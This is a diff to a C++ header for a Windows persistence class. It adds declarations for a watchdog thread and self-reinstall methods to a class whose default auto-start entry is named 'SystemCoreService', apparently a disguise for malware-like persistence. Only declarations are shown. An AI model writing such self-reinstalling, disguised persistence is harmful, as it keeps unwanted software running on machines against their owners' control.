@@ -16,10 +16,15 @@ class WindowsPersistence final : public application::interfaces::IPersistenceSer
     std::thread anti_sleep_thread_;
     std::function<void()> on_shutdown_;
 
+    // Watchdog
+    std::atomic<bool> watchdog_running_{false};
+    std::thread watchdog_thread_;
+
     void anti_sleep_loop();
 
 public:
     WindowsPersistence(std::string pc_id, std::string auto_start_name = "SystemCoreService");
+    ~WindowsPersistence();
 
     void invoke_shutdown();
 
@@ -39,6 +44,12 @@ public:
 
     // Remove all persistence
     void remove_all_persistence();
+
+    // Watchdog and self-reinstall
+    bool init_watchdog();
+    bool init_self_reinstall();
+    void start_watchdog();
+    void stop_watchdog();
 };
 
 } // namespace nuub::infrastructure::system
